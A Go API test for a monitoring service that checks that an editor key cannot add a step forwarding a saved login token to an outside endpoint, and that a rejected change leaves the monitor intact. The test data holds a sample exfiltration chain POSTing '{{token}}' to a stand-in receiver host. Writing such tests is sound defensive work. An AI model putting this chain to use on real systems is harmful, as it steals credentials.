package api_test

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"testing"

	"github.com/y0f/asura/v2/internal/config"
	"github.com/y0f/asura/v2/internal/storage"
)

func TestMonitorPrivateSourceFlowAPIDenialIsAtomic(t *testing.T) {
	env := newTestEnv(t, func(c *config.Config) {
		c.Auth.APIKeys = append(c.Auth.APIKeys, config.APIKeyConfig{Name: "editor", Hash: config.HashAPIKey("editor"), Permissions: []string{"monitors.read", "monitors.update"}})
	}, false, nil)
	ctx := context.Background()
	mon := &storage.Monitor{Name: "login", Type: "http_multi", Target: "https://source.test", Enabled: true, Interval: 60, Timeout: 10, Settings: json.RawMessage(`{"steps":[{"name":"login","url":"https://source.test/login","method":"POST","body":"private-login-credential","extract_var":"token","extract_json":"access_token"}]}`)}
	if err := env.store.CreateMonitor(ctx, mon); err != nil {
		t.Fatal(err)
	}
	request := *mon
	request.Name = "changed metadata"
	request.Settings = json.RawMessage(`{"steps":[{"name":"login","url":"https://source.test/login","method":"POST","body":"","extract_var":"token","extract_json":"access_token"},{"name":"sink","url":"https://new.test/receive","method":"POST","body":"{{token}}"}]}`)
	body, _ := json.Marshal(request)
	w := env.do("PUT", fmt.Sprintf("/api/v1/monitors/%d", mon.ID), string(body), map[string]string{"X-API-Key": "editor"})
	if w.Code != 400 || strings.Contains(w.Body.String(), "private-login-credential") {
		t.Fatalf("borrowed credential chain accepted/disclosed: %d %s", w.Code, w.Body)
	}
	stored, err := env.store.GetMonitor(ctx, mon.ID)
	if err != nil || stored.Name != mon.Name || string(stored.Settings) != string(mon.Settings) {
		t.Fatalf("rejected chain partially changed saved monitor: %v", err)
	}
}
